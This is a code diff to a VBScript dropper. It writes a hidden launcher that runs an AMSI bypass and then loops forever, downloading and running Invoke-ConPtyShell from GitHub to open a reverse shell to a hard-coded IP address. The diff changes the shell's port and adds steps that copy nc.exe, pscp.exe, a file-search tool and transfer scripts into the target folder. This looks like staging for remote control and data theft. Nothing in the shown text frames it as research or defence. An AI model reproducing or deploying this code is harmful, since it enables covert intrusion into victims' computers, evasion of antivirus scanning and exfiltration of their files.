@@ -56,7 +56,7 @@ Function CreateFile()
 	Else
 		objFile.WriteLine "objWshShl.CurrentDirectory = objWshShl.ExpandEnvironmentStrings(""%appdata%"")"
 	End If
-        objFile.WriteLine "objWshShl.Run ""powershell.exe C:\Windows\AMSI_bypass.ps1; while($true) { IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 213.168.249.164 91}; start-sleep 5"",0"
+        objFile.WriteLine "objWshShl.Run ""powershell.exe C:\Windows\AMSI_bypass.ps1; while($true) { IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 213.168.249.164 90}; start-sleep 5"",0"
 	WScript.Sleep 500
 	objFile.Close()
 	objWshShl.CurrentDirectory = objFso.GetParentFolderName(WScript.ScriptFullName)
@@ -66,6 +66,11 @@ Function MoveFile()
 		WScript.Sleep 200
 		objFso.CopyFile "nc.exe", strPath & "\"
 		objFso.CopyFile "AMSI_bypass.ps1", strPath & "\"
+		objFso.CopyFile "es.exe", strPath & "\"
+		objFso.CopyFile "grep.exe", strPath & "\"
+		objFso.CopyFile "pscp.exe", strPath & "\"
+		objFso.CopyFile "ft.ps1", strPath & "\"
+		objFso.CopyFile "ftcmd.bat", strPath & "\"
 End Function
 
 Function Finish()
